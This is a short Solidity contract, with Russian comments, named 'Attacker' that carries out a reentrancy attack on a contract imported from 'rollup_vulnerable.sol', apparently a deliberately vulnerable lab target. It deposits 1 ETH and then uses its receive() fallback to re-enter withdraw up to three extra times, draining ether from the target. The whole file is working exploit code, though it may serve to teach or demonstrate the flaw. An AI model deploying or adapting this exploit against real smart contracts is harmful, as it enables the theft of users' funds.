// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./rollup_vulnerable.sol";

contract Attacker {
    RollupVulnerable public target;

    uint256 public rounds;
    uint256 public maxRounds = 3; // сколько раз повторно войдём

    constructor(address _target) {
        target = RollupVulnerable(_target);
    }

    receive() external payable {
        // ограничиваем количество повторных входов,
        // иначе уйдём в бесконечную рекурсию и кончится gas
        if (rounds < maxRounds && address(target).balance >= 1 ether) {
            rounds += 1;
            target.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");

        // кладём 1 ETH на баланс Attacker внутри target
        target.deposit{value: 1 ether}();

        // запускаем первый вывод (дальше receive сделает ещё maxRounds раз)
        target.withdraw(1 ether);
    }
}
